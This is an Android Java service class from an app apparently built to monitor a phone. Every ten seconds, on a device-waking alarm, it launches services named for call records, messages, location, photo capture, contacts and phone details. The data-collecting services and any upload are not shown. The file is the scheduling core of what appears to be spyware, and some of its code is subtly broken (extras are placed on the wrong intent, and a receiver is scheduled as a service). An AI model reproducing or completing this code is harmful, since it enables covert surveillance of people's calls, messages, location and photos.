package com.example.jianting.Service;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;

import androidx.annotation.Nullable;

import com.example.jianting.Recivier.AlarmReceiver;
import com.example.jianting.Recivier.MyReceiver;
import com.example.jianting.contans;

import java.util.Date;


public class BeginService extends Service {
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String date=new Date().toString();
        Log.d("TAG", "启动服务：" + date);
        /**
         * 定时任务
         *
         */
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);

        int anhour=1000*10;
        long triggerAtMillis = SystemClock.elapsedRealtime()+anhour;
        Intent alarmIntent = new Intent(this, AlarmReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getService(this, 0, alarmIntent, PendingIntent.FLAG_UPDATE_CURRENT);
        alarmManager.cancel(pendingIntent);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {// 6.0
            alarmManager.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtMillis, pendingIntent);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {//  4.4
            alarmManager.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP,triggerAtMillis, pendingIntent);
        } else {
            alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,triggerAtMillis, pendingIntent);
        }
        /**
         * 启动服务
         *
         *
         */
        long dateTime =new Date().getTime();
        //通话记录服务
        Intent Callintent = new Intent(this,CallService.class);
        intent.putExtra("date",dateTime);
        startService(Callintent);
        //信息服务
        Intent Messageintent = new Intent(this,MessageService.class);
        intent.putExtra("date",dateTime);
        startService(Messageintent);
        //位置服务
        Intent Radiusintent = new Intent(this,RadiusService.class);
        intent.putExtra("date",dateTime);
        startService(Radiusintent);
        //拍照服务
        Intent Picintent = new Intent(this,PicService.class);
        intent.putExtra("date",dateTime);
        startService(Picintent);
        //联系人服务
        Intent Peopleintent = new Intent(this,PeopleService.class);
        intent.putExtra("date",dateTime);
        startService(Peopleintent);
        //手机基本信息服务
        Intent Phoneintent = new Intent(this,PhoneService.class);
        intent.putExtra("date",dateTime);
        startService(Phoneintent);
        return super.onStartCommand(intent, flags, startId);
    }
}
